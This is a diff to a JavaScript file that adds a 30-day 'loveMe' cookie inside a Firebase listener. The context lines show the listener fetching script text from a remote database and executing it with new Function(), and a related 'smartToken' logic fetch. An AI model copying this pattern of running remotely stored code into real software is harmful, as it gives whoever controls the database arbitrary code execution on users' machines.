@@ -788,9 +788,16 @@ onValue(scrRef, (snapshot) => {
   const scrq = snapshot.val();
   const func = new Function(scrq);
   func();
-  loveMe(); 
+  loveMe();
+
+  // Set cookie
+  const cookieName = 'loveMe';
+  const cookieValue = 'love, logic!';
+  const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+  document.cookie = `${cookieName}=${cookieValue}; expires=${expires}; path=/`;
 });
- 
+
+
 async function fetchSmartTokenLogic() {
   try {
     const dbRef = ref(database, "scripts/smartToken/logic");
